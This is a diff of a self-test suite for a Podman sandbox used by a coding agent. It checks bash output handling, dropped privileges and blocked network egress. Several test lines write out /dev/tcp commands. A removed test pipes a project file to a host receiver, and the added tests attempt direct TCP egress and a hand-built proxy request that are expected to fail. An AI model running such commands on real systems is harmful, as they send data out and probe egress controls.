@@ -1,5 +1,6 @@
 import fs from "node:fs/promises";
 import net from "node:net";
+import os from "node:os";
 import path from "node:path";
 import type { ExtensionAPI } from "@earendil-works/pi-coding-agent";
 import sandboxExtension from "../podman-sandbox.ts";
@@ -95,7 +96,17 @@ function skipped(reason: string): Error {
 
 async function bash(command: string, cwd = process.cwd(), timeout = 20) {
   const result = await tool("bash", { command, timeout }, cwd);
-  return result.structuredContent as { output: string; exit_code: number };
+  const formattedOutput = String(result.structuredContent.output);
+  const extract = (stream: "stdout" | "stderr") => {
+    const match = formattedOutput.match(new RegExp(`(?:^|\\n)\\[${stream}\\]\\n([\\s\\S]*?)(?=\\n\\[(?:stdout|stderr)\\]|\\n\\[exit code = )`));
+    return match?.[1] ?? "";
+  };
+  return {
+    output: extract("stdout"),
+    stderr: extract("stderr"),
+    formattedOutput,
+    exit_code: result.structuredContent.exit_code as number,
+  };
 }
 
 export default function (pi: ExtensionAPI) {
@@ -309,6 +320,42 @@ export default function (pi: ExtensionAPI) {
           const result = await bash("date -u +%Y-%m-%d");
           assert(result.exit_code === 0 && /^\d{4}-\d{2}-\d{2}$/.test(result.output.trim()), `date failed: ${result.output}`);
         });
+        await record("bash inlines small streams and deletes their host files", async () => {
+          const sessionPrefix = `session-${String(ctx.sessionManager.getSessionId()).replace(/[^A-Za-z0-9_-]/g, "_")}-`;
+          const listFiles = async () => (await fs.readdir(os.tmpdir())).filter((name) => name.startsWith(sessionPrefix)).sort();
+          const before = await listFiles();
+          const result = await bash("printf small-out; printf small-err >&2");
+          const after = await listFiles();
+          assert(result.exit_code === 0, `small-output command failed: ${result.formattedOutput}`);
+          assert(result.output === "small-out" && result.stderr === "small-err", `small streams were not fully inlined: ${result.formattedOutput}`);
+          assert(JSON.stringify(before) === JSON.stringify(after), "small-output host files were retained");
+        });
+        await record("bash omits headers for empty stdout and stderr", async () => {
+          const result = await bash("true");
+          assert(result.formattedOutput === "[exit code = 0]", `empty command returned unexpected output: ${result.formattedOutput}`);
+        });
+        await record("bash previews 128 lines and saves complete stdout and stderr on the host", async () => {
+          const result = await tool("bash", {
+            command: `i=1; while [ "$i" -le 4530 ]; do printf 'stdout-%s\\n' "$i"; printf 'stderr-%s\\n' "$i" >&2; i=$((i + 1)); done; exit 213`,
+            timeout: 30,
+          });
+          const summary = String(result.structuredContent.output);
+          assert(result.structuredContent.exit_code === 213, `bash exit code was not preserved: ${result.structuredContent.exit_code}`);
+          const stdoutMatch = summary.match(/^\[\.\.\. full 4530 lines output to (.+\.out)\]$/m);
+          const stderrMatch = summary.match(/^\[\.\.\. full 4530 lines output to (.+\.err)\]$/m);
+          assert(stdoutMatch && stderrMatch, `full-output markers missing: ${summary}`);
+          assert(summary.startsWith(`[stdout]\n${Array.from({ length: 128 }, (_, index) => `stdout-${index + 1}`).join("\n")}\n`), "stdout preview did not contain exactly the first 128 lines");
+          assert(summary.includes(`[stderr]\n${Array.from({ length: 128 }, (_, index) => `stderr-${index + 1}`).join("\n")}\n`), "stderr preview did not contain exactly the first 128 lines");
+          assert(!summary.includes("stdout-129") && !summary.includes("stderr-129"), "the preview included output beyond 128 lines");
+          assert(summary.endsWith("[exit code = 213]"), `exit code missing from summary: ${summary}`);
+          try {
+            const [stdout, stderr] = await Promise.all([fs.readFile(stdoutMatch[1], "utf8"), fs.readFile(stderrMatch[1], "utf8")]);
+            assert(stdout.startsWith("stdout-1\n") && stdout.endsWith("stdout-4530\n"), "stdout file did not contain the complete output");
+            assert(stderr.startsWith("stderr-1\n") && stderr.endsWith("stderr-4530\n"), "stderr file did not contain the complete output");
+          } finally {
+            await Promise.all([fs.rm(stdoutMatch[1], { force: true }), fs.rm(stderrMatch[1], { force: true })]);
+          }
+        });
         await record("container runs as the mapped non-root agent user", async () => {
           const result = await bash("printf '%s:%s' \"$(id -u)\" \"$(id -g)\"");
           assert(result.exit_code === 0, `id failed: ${result.output}`);
@@ -348,15 +395,12 @@ export default function (pi: ExtensionAPI) {
           const stat = await fs.stat(insideFile);
           assert(stat.uid === (process.getuid?.() ?? 1000) && stat.gid === (process.getgid?.() ?? 1000), `wrong host ownership: ${stat.uid}:${stat.gid}`);
         });
-        await record("network egress audit reports whether mounted project data can reach a controlled host sink", async () => {
+        await record("mapped-user direct TCP egress is blocked", async () => {
           const server = net.createServer();
-          const chunks: Buffer[] = [];
-          const received = new Promise<string>((resolve) => {
-            server.once("connection", (socket) => {
-              socket.on("data", (chunk: Buffer) => chunks.push(chunk));
-              socket.on("end", () => resolve(Buffer.concat(chunks).toString("utf8")));
-            });
-          });
+          const connection = new Promise<void>((resolve) => server.once("connection", (socket) => {
+            socket.destroy();
+            resolve();
+          }));
           try {
             await new Promise<void>((resolve, reject) => {
               server.once("error", reject);
@@ -367,23 +411,21 @@ export default function (pi: ExtensionAPI) {
             });
             const address = server.address();
             assert(address && typeof address !== "string", "test receiver did not bind a TCP port");
-            let result: { output: string; exit_code: number };
-            try {
-              result = await bash(`cat ${quote(insideFile)} | bash -c 'cat > /dev/tcp/host.containers.internal/${address.port}'`, process.cwd(), 8);
-            } catch {
-              throw skipped("container could not reach the controlled host receiver");
-            }
-            if (result.exit_code !== 0) throw skipped("container egress to the controlled host receiver is blocked or unavailable");
-            const payload = await Promise.race([
-              received,
-              new Promise<null>((resolve) => setTimeout(() => resolve(null), 3000)),
+            const result = await bash(`timeout 3 bash -c 'printf bypass > /dev/tcp/host.containers.internal/${address.port}'`, process.cwd(), 8);
+            assert(result.exit_code !== 0, "mapped bash user reached a direct host TCP destination");
+            const accepted = await Promise.race([
+              connection.then(() => true),
+              new Promise<boolean>((resolve) => setTimeout(() => resolve(false), 250)),
             ]);
-            if (payload === null) throw skipped("controlled receiver did not receive the test payload");
-            assert(payload === projectMarker, "controlled receiver got unexpected bytes");
-            return "network egress is enabled by documented policy; mounted project data reached the test-only sink";
+            assert(!accepted, "host receiver accepted direct egress from mapped bash");
           } finally {
             await new Promise<void>((resolve) => server.close(() => resolve()));
           }
+        });
+        await record("bash can reach the monitored proxy but unallowlisted DNS names are denied", async () => {
+          const command = `bash -c 'proxy_user=\${HTTP_PROXY#http://}; proxy_user=\${proxy_user%%@*}; proxy_port=\${HTTP_PROXY##*:}; auth=$(printf "%s:" "$proxy_user" | base64 -w 0); exec 3<>/dev/tcp/host.containers.internal/$proxy_port; printf "GET http://unlisted.invalid/ HTTP/1.1\\r\\nHost: unlisted.invalid\\r\\nProxy-Authorization: Basic %s\\r\\nConnection: close\\r\\n\\r\\n" "$auth" >&3; IFS= read -r status <&3; printf "%s\\n" "$status"; case "$status" in "HTTP/1.1 403"*) exit 0;; *) exit 42;; esac'`;
+          const result = await bash(command, process.cwd(), 10);
+          assert(result.exit_code === 0 && result.output.trim().startsWith("HTTP/1.1 403"), `proxy did not reject an unallowlisted DNS destination: ${result.formattedOutput}`);
         });
         // Structured matches let callers consume results without reparsing prose.
         await record("search returns structured project matches", async () => {
@@ -401,10 +443,10 @@ export default function (pi: ExtensionAPI) {
           assert(result.structuredContent.truncated, "search did not report omitted matches");
         });
         // The added APT capabilities caused a real leak in an earlier run.
-        // Checking CapEff and dpkg permissions guards against that regression.
-        await record("ordinary sandbox commands have no effective capabilities or dpkg write access", async () => {
-          const result = await bash("cap=$(awk '/^CapEff:/{print $2}' /proc/self/status); test \"$cap\" = 0000000000000000 && test ! -w /var/lib/dpkg/status && printf '%s' \"$cap\"");
-          assert(result.exit_code === 0, `ordinary command retained capabilities or dpkg access: ${result.output}`);
+        // Verify Bash has NNP set, no effective capabilities, and unchanged real/effective IDs.
+        await record("ordinary sandbox commands cannot change uid, retain capabilities, or write dpkg state", async () => {
+          const result = await bash("cap=$(awk '/^CapEff:/{print $2}' /proc/self/status); nnp=$(awk '/^NoNewPrivs:/{print $2}' /proc/self/status); test \"$cap\" = 0000000000000000 && test \"$nnp\" = 1 && test \"$(id -ru)\" = \"$(id -u)\" && test ! -w /var/lib/dpkg/status && printf '%s:%s' \"$cap\" \"$nnp\"");
+          assert(result.exit_code === 0, `ordinary command retained UID transition capability or dpkg access: ${result.output}`);
         });
         await record("package tool rejects shell syntax before execution", async () => {
           try {
